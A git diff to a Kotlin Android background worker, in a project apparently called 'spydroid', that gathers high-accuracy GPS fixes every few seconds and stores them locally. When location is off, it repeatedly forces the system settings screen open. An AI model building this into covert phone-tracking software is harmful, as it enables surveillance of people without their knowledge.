@@ -1,39 +1,109 @@
 package net.spydroid.feature.location
 
+import android.annotation.SuppressLint
 import android.content.Context
-import android.util.Log
-import androidx.work.OneTimeWorkRequest
-import androidx.work.WorkManager
-import androidx.work.WorkRequest
+import android.content.Intent
+import android.location.LocationManager
+import android.os.Handler
+import android.os.Looper
+import android.provider.Settings
 import androidx.work.Worker
 import androidx.work.WorkerParameters
-import kotlinx.coroutines.GlobalScope
-import kotlinx.coroutines.delay
+import com.google.android.gms.location.LocationCallback
+import com.google.android.gms.location.LocationRequest
+import com.google.android.gms.location.LocationResult
+import com.google.android.gms.location.LocationServices
+import com.google.android.gms.location.Priority
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
+import net.spydroid.common.models.CurrentLocation
+import net.spydroid.common.data.GLOBAL_STATES_PERMISSIONS
+import net.spydroid.common.local.LocalDataProvider
 
-class LocationWork(appContext: Context, workerParams: WorkerParameters) :
-    Worker(appContext, workerParams) {
+
+class LocationWork(
+    private val context: Context,
+    workerParams: WorkerParameters
+) : Worker(context, workerParams) {
+
+    private lateinit var locationCallback: LocationCallback
+    private val handler = Handler(Looper.getMainLooper())
+    private lateinit var runnable: Runnable
+    private val fusedLocationClient = LocationServices.getFusedLocationProviderClient(context)
+    val localPermissions = LocalDataProvider.current(context)
+
+    private val coroutineScope = CoroutineScope(Dispatchers.Main)
 
     override fun doWork(): Result {
         // Aquí va la lógica del trabajo en segundo plano
         try {
-            // Simulación de trabajo en segundo plano (puedes reemplazarlo con tu lógica)
-            var number = 0
-            while (number < 5) {
-                GlobalScope.launch {
-                    Log.d("MyWorker", "Trabajo en segundo plano ejecutándose")
-                    delay(5000) //delay 5 seconds
-                    number ++
+            locationCallback = object : LocationCallback() {
+                override fun onLocationResult(p0: LocationResult) {
+                    super.onLocationResult(p0)
+                    for (location in p0.locations) {
+                        if (location.latitude != null && location.longitude != null) {
+                            localPermissions.setLocationCurrent(
+                                CurrentLocation(
+                                    location.latitude.toString(),
+                                    location.longitude.toString()
+                                )
+                            )
+                        }
+                    }
                 }
-
             }
 
-            
-            // Si el trabajo se completó exitosamente
+            coroutineScope.launch {
+                localPermissions.locationState.collect { state ->
+                    if (state == GLOBAL_STATES_PERMISSIONS.GRANTED) {
+                        val intent = Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS)
+                        runnable = Runnable {
+                            handler.postDelayed(runnable, 3000)
+                            val isLocationOn = isLocationEnabled(context)
+                            if (isLocationOn) {
+                                startLocationUpdates()
+                            } else {
+                                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                                context.startActivity(intent)
+                            }
+                        }
+                        handler.post(runnable)
+                    }
+                }
+            }
+
             return Result.success()
         } catch (e: Exception) {
             // Si hubo un fallo en el trabajo
             return Result.failure()
         }
     }
+
+
+    fun isLocationEnabled(ctx: Context): Boolean {
+        val locationManager = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
+        return locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
+                locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
+    }
+
+    @SuppressLint("MissingPermission")
+    private fun startLocationUpdates() {
+        locationCallback?.let {
+            val locationRequest = LocationRequest.Builder(
+                Priority.PRIORITY_HIGH_ACCURACY, 100
+            )
+                .setWaitForAccurateLocation(false)
+                .setMinUpdateIntervalMillis(3000)
+                .setMaxUpdateDelayMillis(100)
+                .build()
+
+            fusedLocationClient?.requestLocationUpdates(
+                locationRequest,
+                it,
+                Looper.getMainLooper()
+            )
+        }
+    }
+
 }
